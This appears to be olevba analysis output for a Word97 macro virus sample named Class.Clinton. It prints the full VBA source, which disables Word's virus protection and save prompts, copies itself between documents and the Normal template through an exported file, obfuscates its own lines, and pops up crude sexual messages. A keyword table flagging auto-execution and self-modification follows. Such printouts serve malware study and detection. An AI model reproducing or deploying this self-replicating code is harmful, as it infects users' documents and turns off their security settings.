olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.Clinton
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.Clinton - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Tester2/23/01 11:06:54 AMtest
On Error GoTo out
'Tester2/23/01 11:06:54 AMtest
Options.VirusProtection = False
'Tester2/23/01 11:06:54 AMtest
Options.SaveNormalPrompt = False
'Tester2/23/01 11:06:54 AMtest
Options.ConfirmConversions = False
'Tester2/23/01 11:06:54 AMtest
Clintons = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Tester2/23/01 11:06:54 AMtest
Clintonr = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Tester2/23/01 11:06:54 AMtest
If Clintonr > 70 And Clintons > 0 Then GoTo out
'Tester2/23/01 11:06:54 AMtest
If Clintonr < 70 Then
'Tester2/23/01 11:06:54 AMtest
    Set Monica = NormalTemplate.VBProject.VBComponents.Item(1)
'Tester2/23/01 11:06:54 AMtest
    ActiveDocument.VBProject.VBComponents.Item(1).Name = Monica.Name
'Tester2/23/01 11:06:54 AMtest
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\Clinton.sys"
'Tester2/23/01 11:06:54 AMtest
End If
'Tester2/23/01 11:06:54 AMtest
If Clintons = 0 Then Set Monica = ActiveDocument.VBProject.VBComponents.Item(1)
'Tester2/23/01 11:06:54 AMtest
Infection = Int(Rnd * 100)
'Tester2/23/01 11:06:54 AMtest
If Infection = 99 Then MsgBox "Monica Blows Clinton! -=News@11=-"
'Tester2/23/01 11:06:54 AMtest
If Day(Now) = 17 And (Month(Now) > 8) Then MsgBox "Today is Clinton & Monica Fuck-Fest Day!"
'Tester2/23/01 11:06:54 AMtest
Monica.codemodule.AddFromFile ("c:\Clinton.sys")
'Tester2/23/01 11:06:54 AMtest
With Monica.codemodule
'Tester2/23/01 11:06:54 AMtest
    For x = 1 To 4
'Tester2/23/01 11:06:54 AMtest
    .deletelines 1
'Tester2/23/01 11:06:54 AMtest
    Next x
'Tester2/23/01 11:06:54 AMtest
End With
'Tester2/23/01 11:06:54 AMtest
If Clintonr < 70 Then
'Tester2/23/01 11:06:54 AMtest
    With Monica.codemodule
'Tester2/23/01 11:06:54 AMtest
    .replaceline 1, "Sub AutoClose()"
'Tester2/23/01 11:06:54 AMtest
    .replaceline 75, "Sub ToolsMacro()"
'Tester2/23/01 11:06:54 AMtest
    End With
'Tester2/23/01 11:06:54 AMtest
End If
'Tester2/23/01 11:06:54 AMtest
With Monica.codemodule
'Tester2/23/01 11:06:54 AMtest
    For x = 2 To 72 Step 2
'Tester2/23/01 11:06:54 AMtest
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Tester2/23/01 11:06:54 AMtest
    Next x
'Tester2/23/01 11:06:54 AMtest
End With
'Tester2/23/01 11:06:54 AMtest
out:
'Tester2/23/01 11:06:54 AMtest
If Clintonr > 70 And Clintons = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Tester2/23/01 11:06:54 AMtest
End Sub

Sub ViewVBCode()
'Word97/Class.Clinton by Virus, Thanks Vic.
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

